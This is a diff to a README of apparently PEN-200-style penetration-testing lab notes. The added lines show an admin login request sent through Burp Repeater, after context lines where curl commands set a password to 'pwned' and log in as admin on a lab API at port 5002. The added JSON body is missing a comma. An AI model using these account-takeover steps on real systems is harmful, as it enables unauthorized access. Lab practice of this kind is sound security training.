@@ -128,4 +128,12 @@ This repo is structured in the same manner as the OffSec PEN-200 course and will
   -H 'Authorization: OAuth <auth token>' \
   -d '{"password": "pwned"}'```
 - Login as admin: ```curl -d '{"password":"pwned","username":"admin"}' -H 'Content-Type: application/json'  http://<host IP>:5002/<API path>/login```
-- 
+- Using Burp, from the Repeater tab, new empty request:
+  ```POST /<API path>/login HTTP/1.1
+     Host: <host IP>:5002
+     Content-Type: application/json
+
+  {
+    "password":"pwned"
+    "username":"admin"
+  }```
